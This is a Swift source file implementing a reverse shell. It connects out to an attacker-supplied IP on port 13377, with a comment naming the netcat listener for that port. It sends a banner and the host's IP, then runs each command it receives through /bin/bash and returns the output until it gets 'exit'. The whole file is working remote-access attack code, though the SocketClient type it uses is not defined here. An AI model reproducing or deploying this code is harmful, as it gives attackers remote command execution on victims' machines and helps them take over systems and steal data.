import Foundation

func runShellCommand(_ command: String) -> String {
    let task = Process()
    task.launchPath = "/bin/bash"
    task.arguments = ["-c", command]

    let pipe = Pipe()
    task.standardOutput = pipe
    task.launch()

    let data = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: data, encoding: .utf8) ?? ""

    return output
}

func main() {
    let we = """
        _____            _      _____          _
       |  __ \\          | |    / ____|        | |
       | |__) |___  __ _| |___| |     ___   __| | ___
       |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\
       | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/
       |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___|
    """

    let po = 13377 // nc -l -p 13377

    guard CommandLine.arguments.count > 1 else {
        print("Please provide the IP address as a command-line argument.")
        return
    }

    let ip = CommandLine.arguments[1]

    let clientIp = Host.current().address ?? "localhost"
    let fullWe = "\(we)\nClient IP: \(clientIp)\n"

    let socket = SocketClient(ip: ip, port: po)
    socket.connect()

    print("\(ip):\(po)")
    socket.send(data: fullWe)

    while true {
        socket.send(string: "$ ")
        if let command = socket.receive(upTo: po) {
            let commandStr = String(bytes: command, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""

            if commandStr == "exit" {
                break
            }

            let output = runShellCommand(commandStr)
            socket.send(string: output)
        } else {
            break
        }
    }

    socket.close()
}

main()
